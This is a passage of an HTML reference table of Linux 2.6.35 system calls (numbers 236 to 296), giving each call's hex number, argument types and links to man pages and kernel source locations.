<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/lremovexattr.2.html" target="_blank" rel="external">sys_lremovexattr</a></td>
<td>0xec</td>
<td>const char __user *path</td>
<td>const char __user *name</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/xattr.c?v=2.6.35#L527" target="_blank" rel="external">fs/xattr.c:527</a></td>
</tr>
<tr>
<td>237</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fremovexattr.2.html" target="_blank" rel="external">sys_fremovexattr</a></td>
<td>0xed</td>
<td>int fd</td>
<td>const char __user *name</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/xattr.c?v=2.6.35#L545" target="_blank" rel="external">fs/xattr.c:545</a></td>
</tr>
<tr>
<td>238</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/tkill.2.html" target="_blank" rel="external">sys_tkill</a></td>
<td>0xee</td>
<td>int pid</td>
<td>int sig</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2395" target="_blank" rel="external">kernel/signal.c:2395</a></td>
</tr>
<tr>
<td>239</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sendfile64.2.html" target="_blank" rel="external">sys_sendfile64</a></td>
<td>0xef</td>
<td>int out_fd</td>
<td>int in_fd</td>
<td>loff_t __user *offset</td>
<td>size_t count</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/read_write.c?v=2.6.35#L916" target="_blank" rel="external">fs/read_write.c:916</a></td>
</tr>
<tr>
<td>240</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/futex.2.html" target="_blank" rel="external">sys_futex</a></td>
<td>0xf0</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/futex.c?v=2.6.35#L2605" target="_blank" rel="external">kernel/futex.c:2605</a></td>
</tr>
<tr>
<td>241</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_setaffinity.2.html" target="_blank" rel="external">sys_sched_setaffinity</a></td>
<td>0xf1</td>
<td>pid_t pid</td>
<td>unsigned int len</td>
<td>unsigned long __user *user_mask_ptr</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/sched.c?v=2.6.35#L4765" target="_blank" rel="external">kernel/sched.c:4765</a></td>
</tr>
<tr>
<td>242</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/sched_getaffinity.2.html" target="_blank" rel="external">sys_sched_getaffinity</a></td>
<td>0xf2</td>
<td>pid_t pid</td>
<td>unsigned int len</td>
<td>unsigned long __user *user_mask_ptr</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/sched.c?v=2.6.35#L4817" target="_blank" rel="external">kernel/sched.c:4817</a></td>
</tr>
<tr>
<td>243</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/set_thread_area.2.html" target="_blank" rel="external">sys_set_thread_area</a></td>
<td>0xf3</td>
<td><a href="http://lxr.free-electrons.com/source/arch/x86/include/asm/ldt.h?v=2.6.35#L20" target="_blank" rel="external">struct user_desc __user *</a></td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/arch/mips/kernel/syscall.c?v=2.6.35#L222" target="_blank" rel="external">arch/mips/kernel/syscall.c:222</a></td>
</tr>
<tr>
<td>244</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/get_thread_area.2.html" target="_blank" rel="external">sys_get_thread_area</a></td>
<td>0xf4</td>
<td><a href="http://lxr.free-electrons.com/source/arch/x86/include/asm/ldt.h?v=2.6.35#L20" target="_blank" rel="external">struct user_desc __user *</a></td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/not%20found?v=2.6.35#L" target="_blank" rel="external">not found:</a></td>
</tr>
<tr>
<td>245</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/io_setup.2.html" target="_blank" rel="external">sys_io_setup</a></td>
<td>0xf5</td>
<td>unsigned nr_reqs</td>
<td>aio_context_t __user *ctx</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/aio.c?v=2.6.35#L1245" target="_blank" rel="external">fs/aio.c:1245</a></td>
</tr>
<tr>
<td>246</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/io_destroy.2.html" target="_blank" rel="external">sys_io_destroy</a></td>
<td>0xf6</td>
<td>aio_context_t ctx</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/aio.c?v=2.6.35#L1283" target="_blank" rel="external">fs/aio.c:1283</a></td>
</tr>
<tr>
<td>247</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/io_getevents.2.html" target="_blank" rel="external">sys_io_getevents</a></td>
<td>0xf7</td>
<td>aio_context_t ctx_id</td>
<td>long min_nr</td>
<td>long nr</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/aio_abi.h?v=2.6.35#L58" target="_blank" rel="external">struct io_event __user *events</a></td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116" target="_blank" rel="external">struct timespec __user *timeout</a></td>
<td><a href="http://lxr.free-electrons.com/source/fs/aio.c?v=2.6.35#L1808" target="_blank" rel="external">fs/aio.c:1808</a></td>
</tr>
<tr>
<td>248</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/io_submit.2.html" target="_blank" rel="external">sys_io_submit</a></td>
<td>0xf8</td>
<td>aio_context_t</td>
<td>long</td>
<td>struct iocb <strong>user * </strong>user *</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/aio.c?v=2.6.35#L1711" target="_blank" rel="external">fs/aio.c:1711</a></td>
</tr>
<tr>
<td>249</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/io_cancel.2.html" target="_blank" rel="external">sys_io_cancel</a></td>
<td>0xf9</td>
<td>aio_context_t ctx_id</td>
<td>struct iocb __user *iocb</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/aio_abi.h?v=2.6.35#L58" target="_blank" rel="external">struct io_event __user *result</a></td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/aio.c?v=2.6.35#L1746" target="_blank" rel="external">fs/aio.c:1746</a></td>
</tr>
<tr>
<td>250</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fadvise64.2.html" target="_blank" rel="external">sys_fadvise64</a></td>
<td>0xfa</td>
<td>int fd</td>
<td>loff_t offset</td>
<td>size_t len</td>
<td>int advice</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/not%20found?v=2.6.35#L" target="_blank" rel="external">not found:</a></td>
</tr>
<tr>
<td>251</td>
<td>not implemented</td>
<td>0xfb</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td></td>
</tr>
<tr>
<td>252</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/exit_group.2.html" target="_blank" rel="external">sys_exit_group</a></td>
<td>0xfc</td>
<td>int error_code</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/exit.c?v=2.6.35#L1087" target="_blank" rel="external">kernel/exit.c:1087</a></td>
</tr>
<tr>
<td>253</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/lookup_dcookie.2.html" target="_blank" rel="external">sys_lookup_dcookie</a></td>
<td>0xfd</td>
<td>u64 cookie64</td>
<td>char __user *buf</td>
<td>size_t len</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/not%20found?v=2.6.35#L" target="_blank" rel="external">not found:</a></td>
</tr>
<tr>
<td>254</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/epoll_create.2.html" target="_blank" rel="external">sys_epoll_create</a></td>
<td>0xfe</td>
<td>int size</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/eventpoll.c?v=2.6.35#L1215" target="_blank" rel="external">fs/eventpoll.c:1215</a></td>
</tr>
<tr>
<td>255</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/epoll_ctl.2.html" target="_blank" rel="external">sys_epoll_ctl</a></td>
<td>0xff</td>
<td>int epfd</td>
<td>int op</td>
<td>int fd</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/eventpoll.h?v=2.6.35#L47" target="_blank" rel="external">struct epoll_event __user *event</a></td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/eventpoll.c?v=2.6.35#L1228" target="_blank" rel="external">fs/eventpoll.c:1228</a></td>
</tr>
<tr>
<td>256</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/epoll_wait.2.html" target="_blank" rel="external">sys_epoll_wait</a></td>
<td>0x100</td>
<td>int epfd</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/eventpoll.h?v=2.6.35#L47" target="_blank" rel="external">struct epoll_event __user *events</a></td>
<td>int maxevents</td>
<td>int timeout</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/eventpoll.c?v=2.6.35#L1320" target="_blank" rel="external">fs/eventpoll.c:1320</a></td>
</tr>
<tr>
<td>257</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/remap_file_pages.2.html" target="_blank" rel="external">sys_remap_file_pages</a></td>
<td>0x101</td>
<td>unsigned long start</td>
<td>unsigned long size</td>
<td>unsigned long prot</td>
<td>unsigned long pgoff</td>
<td>unsigned long flags</td>
<td><a href="http://lxr.free-electrons.com/source/mm/fremap.c?v=2.6.35#L123" target="_blank" rel="external">mm/fremap.c:123</a></td>
</tr>
<tr>
<td>258</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/set_tid_address.2.html" target="_blank" rel="external">sys_set_tid_address</a></td>
<td>0x102</td>
<td>int __user *tidptr</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/fork.c?v=2.6.35#L920" target="_blank" rel="external">kernel/fork.c:920</a></td>
</tr>
<tr>
<td>259</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/timer_create.2.html" target="_blank" rel="external">sys_timer_create</a></td>
<td>0x103</td>
<td>clockid_t which_clock</td>
<td><a href="http://lxr.free-electrons.com/source/include/asm-generic/siginfo.h?v=2.6.35#L259" target="_blank" rel="external">struct sigevent __user *timer_event_spec</a></td>
<td>timer_t __user * created_timer_id</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/posix-timers.c?v=2.6.35#L522" target="_blank" rel="external">kernel/posix-timers.c:522</a></td>
</tr>
<tr>
<td>260</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/timer_settime.2.html" target="_blank" rel="external">sys_timer_settime</a></td>
<td>0x104</td>
<td>timer_t timer_id</td>
<td>int flags</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L258" target="_blank" rel="external">const struct itimerspec __user *new_setting</a></td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L258" target="_blank" rel="external">struct itimerspec __user *old_setting</a></td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/posix-timers.c?v=2.6.35#L800" target="_blank" rel="external">kernel/posix-timers.c:800</a></td>
</tr>
<tr>
<td>261</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/timer_gettime.2.html" target="_blank" rel="external">sys_timer_gettime</a></td>
<td>0x105</td>
<td>timer_t timer_id</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L258" target="_blank" rel="external">struct itimerspec __user *setting</a></td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/posix-timers.c?v=2.6.35#L702" target="_blank" rel="external">kernel/posix-timers.c:702</a></td>
</tr>
<tr>
<td>262</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/timer_getoverrun.2.html" target="_blank" rel="external">sys_timer_getoverrun</a></td>
<td>0x106</td>
<td>timer_t timer_id</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/posix-timers.c?v=2.6.35#L732" target="_blank" rel="external">kernel/posix-timers.c:732</a></td>
</tr>
<tr>
<td>263</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/timer_delete.2.html" target="_blank" rel="external">sys_timer_delete</a></td>
<td>0x107</td>
<td>timer_t timer_id</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/posix-timers.c?v=2.6.35#L855" target="_blank" rel="external">kernel/posix-timers.c:855</a></td>
</tr>
<tr>
<td>264</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/clock_settime.2.html" target="_blank" rel="external">sys_clock_settime</a></td>
<td>0x108</td>
<td>clockid_t which_clock</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116" target="_blank" rel="external">const struct timespec __user *tp</a></td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/posix-timers.c?v=2.6.35#L941" target="_blank" rel="external">kernel/posix-timers.c:941</a></td>
</tr>
<tr>
<td>265</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/clock_gettime.2.html" target="_blank" rel="external">sys_clock_gettime</a></td>
<td>0x109</td>
<td>clockid_t which_clock</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116" target="_blank" rel="external">struct timespec __user *tp</a></td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/posix-timers.c?v=2.6.35#L954" target="_blank" rel="external">kernel/posix-timers.c:954</a></td>
</tr>
<tr>
<td>266</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/clock_getres.2.html" target="_blank" rel="external">sys_clock_getres</a></td>
<td>0x10a</td>
<td>clockid_t which_clock</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116" target="_blank" rel="external">struct timespec __user *tp</a></td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/posix-timers.c?v=2.6.35#L971" target="_blank" rel="external">kernel/posix-timers.c:971</a></td>
</tr>
<tr>
<td>267</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/clock_nanosleep.2.html" target="_blank" rel="external">sys_clock_nanosleep</a></td>
<td>0x10b</td>
<td>clockid_t which_clock</td>
<td>int flags</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116" target="_blank" rel="external">const struct timespec __user *rqtp</a></td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116" target="_blank" rel="external">struct timespec __user *rmtp</a></td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/posix-timers.c?v=2.6.35#L1001" target="_blank" rel="external">kernel/posix-timers.c:1001</a></td>
</tr>
<tr>
<td>268</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/statfs64.2.html" target="_blank" rel="external">sys_statfs64</a></td>
<td>0x10c</td>
<td>const char __user *path</td>
<td>size_t sz</td>
<td><a href="http://lxr.free-electrons.com/source/arch/mips/include/asm/statfs.h?v=2.6.35#L63" target="_blank" rel="external">struct statfs64 __user *buf</a></td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/statfs.c?v=2.6.35#L118" target="_blank" rel="external">fs/statfs.c:118</a></td>
</tr>
<tr>
<td>269</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fstatfs64.2.html" target="_blank" rel="external">sys_fstatfs64</a></td>
<td>0x10d</td>
<td>unsigned int fd</td>
<td>size_t sz</td>
<td><a href="http://lxr.free-electrons.com/source/arch/mips/include/asm/statfs.h?v=2.6.35#L63" target="_blank" rel="external">struct statfs64 __user *buf</a></td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/statfs.c?v=2.6.35#L154" target="_blank" rel="external">fs/statfs.c:154</a></td>
</tr>
<tr>
<td>270</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/tgkill.2.html" target="_blank" rel="external">sys_tgkill</a></td>
<td>0x10e</td>
<td>int tgid</td>
<td>int pid</td>
<td>int sig</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/signal.c?v=2.6.35#L2383" target="_blank" rel="external">kernel/signal.c:2383</a></td>
</tr>
<tr>
<td>271</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/utimes.2.html" target="_blank" rel="external">sys_utimes</a></td>
<td>0x10f</td>
<td>char __user *filename</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/time.h?v=2.6.35#L20" target="_blank" rel="external">struct timeval __user *utimes</a></td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/utimes.c?v=2.6.35#L219" target="_blank" rel="external">fs/utimes.c:219</a></td>
</tr>
<tr>
<td>272</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/fadvise64_64.2.html" target="_blank" rel="external">sys_fadvise64_64</a></td>
<td>0x110</td>
<td>int fd</td>
<td>loff_t offset</td>
<td>loff_t len</td>
<td>int advice</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/not%20found?v=2.6.35#L" target="_blank" rel="external">not found:</a></td>
</tr>
<tr>
<td>273</td>
<td>not implemented</td>
<td>0x111</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td></td>
</tr>
<tr>
<td>274</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mbind.2.html" target="_blank" rel="external">sys_mbind</a></td>
<td>0x112</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/mm/mempolicy.c?v=2.6.35#L1232" target="_blank" rel="external">mm/mempolicy.c:1232</a></td>
</tr>
<tr>
<td>275</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/get_mempolicy.2.html" target="_blank" rel="external">sys_get_mempolicy</a></td>
<td>0x113</td>
<td>int __user *policy</td>
<td>unsigned long __user *nmask</td>
<td>unsigned long maxnode</td>
<td>unsigned long addr</td>
<td>unsigned long flags</td>
<td><a href="http://lxr.free-electrons.com/source/mm/mempolicy.c?v=2.6.35#L1348" target="_blank" rel="external">mm/mempolicy.c:1348</a></td>
</tr>
<tr>
<td>276</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/set_mempolicy.2.html" target="_blank" rel="external">sys_set_mempolicy</a></td>
<td>0x114</td>
<td>int mode</td>
<td>unsigned long __user *nmask</td>
<td>unsigned long maxnode</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/mm/mempolicy.c?v=2.6.35#L1254" target="_blank" rel="external">mm/mempolicy.c:1254</a></td>
</tr>
<tr>
<td>277</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mq_open.2.html" target="_blank" rel="external">sys_mq_open</a></td>
<td>0x115</td>
<td>const char __user *name</td>
<td>int oflag</td>
<td>mode_t mode</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/mqueue.h?v=2.6.35#L25" target="_blank" rel="external">struct mq_attr __user *attr</a></td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/ipc/mqueue.c?v=2.6.35#L673" target="_blank" rel="external">ipc/mqueue.c:673</a></td>
</tr>
<tr>
<td>278</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mq_unlink.2.html" target="_blank" rel="external">sys_mq_unlink</a></td>
<td>0x116</td>
<td>const char __user *name</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/ipc/mqueue.c?v=2.6.35#L746" target="_blank" rel="external">ipc/mqueue.c:746</a></td>
</tr>
<tr>
<td>279</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mq_timedsend.2.html" target="_blank" rel="external">sys_mq_timedsend</a></td>
<td>0x117</td>
<td>mqd_t mqdes</td>
<td>const char __user *msg_ptr</td>
<td>size_t msg_len</td>
<td>unsigned int msg_prio</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116" target="_blank" rel="external">const struct timespec __user *abs_timeout</a></td>
<td><a href="http://lxr.free-electrons.com/source/ipc/mqueue.c?v=2.6.35#L840" target="_blank" rel="external">ipc/mqueue.c:840</a></td>
</tr>
<tr>
<td>280</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mq_timedreceive.2.html" target="_blank" rel="external">sys_mq_timedreceive</a></td>
<td>0x118</td>
<td>mqd_t mqdes</td>
<td>char __user *msg_ptr</td>
<td>size_t msg_len</td>
<td>unsigned int __user *msg_prio</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/coda.h?v=2.6.35#L116" target="_blank" rel="external">const struct timespec __user *abs_timeout</a></td>
<td><a href="http://lxr.free-electrons.com/source/ipc/mqueue.c?v=2.6.35#L934" target="_blank" rel="external">ipc/mqueue.c:934</a></td>
</tr>
<tr>
<td>281</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mq_notify.2.html" target="_blank" rel="external">sys_mq_notify</a></td>
<td>0x119</td>
<td>mqd_t mqdes</td>
<td><a href="http://lxr.free-electrons.com/source/include/asm-generic/siginfo.h?v=2.6.35#L259" target="_blank" rel="external">const struct sigevent __user *notification</a></td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/ipc/mqueue.c?v=2.6.35#L1023" target="_blank" rel="external">ipc/mqueue.c:1023</a></td>
</tr>
<tr>
<td>282</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mq_getsetattr.2.html" target="_blank" rel="external">sys_mq_getsetattr</a></td>
<td>0x11a</td>
<td>mqd_t mqdes</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/mqueue.h?v=2.6.35#L25" target="_blank" rel="external">const struct mq_attr __user *mqstat</a></td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/mqueue.h?v=2.6.35#L25" target="_blank" rel="external">struct mq_attr __user *omqstat</a></td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/ipc/mqueue.c?v=2.6.35#L1154" target="_blank" rel="external">ipc/mqueue.c:1154</a></td>
</tr>
<tr>
<td>283</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/kexec_load.2.html" target="_blank" rel="external">sys_kexec_load</a></td>
<td>0x11b</td>
<td>unsigned long entry</td>
<td>unsigned long nr_segments</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/kexec.h?v=2.6.35#L61" target="_blank" rel="external">struct kexec_segment __user *segments</a></td>
<td>unsigned long flags</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/kernel/kexec.c?v=2.6.35#L939" target="_blank" rel="external">kernel/kexec.c:939</a></td>
</tr>
<tr>
<td>284</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/waitid.2.html" target="_blank" rel="external">sys_waitid</a></td>
<td>0x11c</td>
<td>int which</td>
<td>pid_t pid</td>
<td><a href="http://lxr.free-electrons.com/source/arch/ia64/include/asm/siginfo.h?v=2.6.35#L19" target="_blank" rel="external">struct siginfo __user *infop</a></td>
<td>int options</td>
<td><a href="http://lxr.free-electrons.com/source/include/linux/resource.h?v=2.6.35#L22" target="_blank" rel="external">struct rusage __user *ru</a></td>
<td><a href="http://lxr.free-electrons.com/source/kernel/exit.c?v=2.6.35#L1655" target="_blank" rel="external">kernel/exit.c:1655</a></td>
</tr>
<tr>
<td>285</td>
<td>not implemented</td>
<td>0x11d</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td></td>
</tr>
<tr>
<td>286</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/add_key.2.html" target="_blank" rel="external">sys_add_key</a></td>
<td>0x11e</td>
<td>const char __user *_type</td>
<td>const char __user *_description</td>
<td>const void __user *_payload</td>
<td>size_t plen</td>
<td>key_serial_t destringid</td>
<td><a href="http://lxr.free-electrons.com/source/security/keys/keyctl.c?v=2.6.35#L57" target="_blank" rel="external">security/keys/keyctl.c:57</a></td>
</tr>
<tr>
<td>287</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/request_key.2.html" target="_blank" rel="external">sys_request_key</a></td>
<td>0x11f</td>
<td>const char __user *_type</td>
<td>const char __user *_description</td>
<td>const char __user *_callout_info</td>
<td>key_serial_t destringid</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/security/keys/keyctl.c?v=2.6.35#L149" target="_blank" rel="external">security/keys/keyctl.c:149</a></td>
</tr>
<tr>
<td>288</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/keyctl.2.html" target="_blank" rel="external">sys_keyctl</a></td>
<td>0x120</td>
<td>int cmd</td>
<td>unsigned long arg2</td>
<td>unsigned long arg3</td>
<td>unsigned long arg4</td>
<td>unsigned long arg5</td>
<td><a href="http://lxr.free-electrons.com/source/security/keys/keyctl.c?v=2.6.35#L1338" target="_blank" rel="external">security/keys/keyctl.c:1338</a></td>
</tr>
<tr>
<td>289</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ioprio_set.2.html" target="_blank" rel="external">sys_ioprio_set</a></td>
<td>0x121</td>
<td>int which</td>
<td>int who</td>
<td>int ioprio</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/ioprio.c?v=2.6.35#L76" target="_blank" rel="external">fs/ioprio.c:76</a></td>
</tr>
<tr>
<td>290</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/ioprio_get.2.html" target="_blank" rel="external">sys_ioprio_get</a></td>
<td>0x122</td>
<td>int which</td>
<td>int who</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/ioprio.c?v=2.6.35#L192" target="_blank" rel="external">fs/ioprio.c:192</a></td>
</tr>
<tr>
<td>291</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/inotify_init.2.html" target="_blank" rel="external">sys_inotify_init</a></td>
<td>0x123</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/notify/inotify/inotify_user.c?v=2.6.35#L680" target="_blank" rel="external">fs/notify/inotify/inotify_user.c:680</a></td>
</tr>
<tr>
<td>292</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/inotify_add_watch.2.html" target="_blank" rel="external">sys_inotify_add_watch</a></td>
<td>0x124</td>
<td>int fd</td>
<td>const char __user *path</td>
<td>u32 mask</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/notify/inotify/inotify_user.c?v=2.6.35#L685" target="_blank" rel="external">fs/notify/inotify/inotify_user.c:685</a></td>
</tr>
<tr>
<td>293</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/inotify_rm_watch.2.html" target="_blank" rel="external">sys_inotify_rm_watch</a></td>
<td>0x125</td>
<td>int fd</td>
<td>__s32 wd</td>
<td>-</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/notify/inotify/inotify_user.c?v=2.6.35#L726" target="_blank" rel="external">fs/notify/inotify/inotify_user.c:726</a></td>
</tr>
<tr>
<td>294</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/migrate_pages.2.html" target="_blank" rel="external">sys_migrate_pages</a></td>
<td>0x126</td>
<td>pid_t pid</td>
<td>unsigned long maxnode</td>
<td>const unsigned long __user *from</td>
<td>const unsigned long __user *to</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/mm/mempolicy.c?v=2.6.35#L1273" target="_blank" rel="external">mm/mempolicy.c:1273</a></td>
</tr>
<tr>
<td>295</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/openat.2.html" target="_blank" rel="external">sys_openat</a></td>
<td>0x127</td>
<td>int dfd</td>
<td>const char __user *filename</td>
<td>int flags</td>
<td>int mode</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/open.c?v=2.6.35#L913" target="_blank" rel="external">fs/open.c:913</a></td>
</tr>
<tr>
<td>296</td>
<td><a href="http://www.kernel.org/doc/man-pages/online/pages/man2/mkdirat.2.html" target="_blank" rel="external">sys_mkdirat</a></td>
<td>0x128</td>
<td>int dfd</td>
<td>const char __user * pathname</td>
<td>int mode</td>
<td>-</td>
<td>-</td>
<td><a href="http://lxr.free-electrons.com/source/fs/namei.c?v=2.6.35#L2093" target="_blank" rel="external">fs/namei.c:2093</a></td>
</tr>
<tr>
<td>297</td>
